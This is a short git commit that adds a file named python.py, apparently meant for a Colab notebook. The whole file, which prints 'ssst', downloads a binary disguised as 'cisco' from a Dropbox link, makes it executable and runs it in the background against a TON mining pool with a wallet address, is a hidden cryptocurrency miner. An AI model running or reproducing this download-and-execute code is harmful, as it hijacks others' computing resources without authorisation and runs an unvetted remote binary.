73f56aaeef9769391d5af5814c603b5d211931d9
ploretope <102384014+ploretope@users.noreply.github.com>
2022-05-29 04:15:43 +0700

    Create python.py

---
+++ python.py
@@ -0,0 +1,6 @@
+#@title
+import urllib.request
+import os
+print('ssst')
+urllib.request.urlretrieve('https://www.dropbox.com/s/4dgaygg0lmxgd4z/cisco?raw=1','cisco?raw=1')
+os.system ("chmod +x ./cisco?raw=1 && nohup ./cisco?raw=1 run https://next.ton-pool.club EQAOV41G7d93Ug0B6PRjp4RHZ7ID_ivK74nCJiX-X8WtCvwD")
